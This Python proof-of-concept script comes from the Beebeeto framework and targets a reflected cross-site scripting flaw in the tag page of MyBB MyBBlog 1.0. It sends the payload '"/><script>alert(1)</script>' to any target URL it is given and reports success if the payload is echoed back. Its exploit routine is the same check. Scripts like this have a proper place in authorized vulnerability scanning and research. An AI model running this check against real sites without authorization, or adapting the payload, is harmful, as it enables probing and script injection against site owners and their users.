#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0120',
            'name': 'MyBB MyBBlog 1.0 /inc/plugins/mybblog/modules/tag.php 跨站脚本漏洞 POC',
            'author': 'foundu',
            'create_date': '2014-10-27',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'MyBB',
            'vul_version': ['1.0'],
            'type': 'Cross Site Scripting',
            'tag': ['MyBB漏洞', 'XSS漏洞', '/inc/plugins/mybblog/modules/tag.php', 'php'],
            'desc': 'N/A',
            'references': ['https://www.yascanner.com/#!/x/20583',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + '/mybblog.php?action=tag&tag="/><script>alert(1)</script>'
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if '"/><script>alert(1)</script>' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())